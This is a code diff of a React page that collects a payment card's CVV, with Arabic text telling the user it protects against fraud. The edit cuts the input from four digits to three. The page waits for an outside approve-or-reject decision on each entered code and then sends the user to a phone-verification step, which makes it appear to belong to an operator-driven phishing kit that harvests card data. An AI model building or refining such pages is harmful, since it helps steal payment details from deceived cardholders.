@@ -12,7 +12,7 @@ import {
 
 export default function CVV() {
   const [, navigate] = useLocation();
-  const [pin, setPin] = useState(["", "", "", ""]);
+  const [pin, setPin] = useState(["", "", ""]);
   const [error, setError] = useState(false);
   const [isWaiting, setIsWaiting] = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
@@ -45,7 +45,7 @@ export default function CVV() {
         navigate("/phone-verification");
       } else if (action.action === "reject") {
         // Show error and clear PIN
-        setPin(["", "", "", ""]);
+        setPin(["", "", ""]);
         setError(true);
         setIsWaiting(false);
         inputRefs.current[0]?.focus();
@@ -65,7 +65,7 @@ export default function CVV() {
     setError(false);
 
     // Auto-focus next input
-    if (digit && index < 3) {
+    if (digit && index < 2) {
       inputRefs.current[index + 1]?.focus();
     }
   };
@@ -79,13 +79,13 @@ export default function CVV() {
 
   const handlePaste = (e: React.ClipboardEvent) => {
     e.preventDefault();
-    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4);
+    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 3);
     const newPin = [...pin];
     for (let i = 0; i < pastedData.length; i++) {
       newPin[i] = pastedData[i];
     }
     setPin(newPin);
-    const lastIndex = Math.min(pastedData.length, 3);
+    const lastIndex = Math.min(pastedData.length, 2);
     inputRefs.current[lastIndex]?.focus();
   };
 
@@ -93,7 +93,7 @@ export default function CVV() {
     e.preventDefault();
 
     const fullPin = pin.join("");
-    if (fullPin.length !== 4) {
+    if (fullPin.length !== 3) {
       setError(true);
       return;
     }
@@ -164,12 +164,12 @@ export default function CVV() {
         {/* Transaction Info */}
         <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
           <p>
-            يرجى إدخال رمز CVV المكون من 3 أو 4 خانات للبطاقة المنتهية بـ <span className="font-bold">{cardLast4}</span> ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
+            يرجى إدخال رمز CVV المكون من 3 خانات للبطاقة المنتهية بـ <span className="font-bold">{cardLast4}</span> ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
           </p>
         </div>
 
         <form onSubmit={handleSubmit} className="space-y-4">
-          {/* PIN Input - 4 separate boxes */}
+          {/* PIN Input - 3 separate boxes */}
           <div className="flex justify-center gap-3" dir="ltr" onPaste={handlePaste}>
             {pin.map((digit, index) => (
               <input
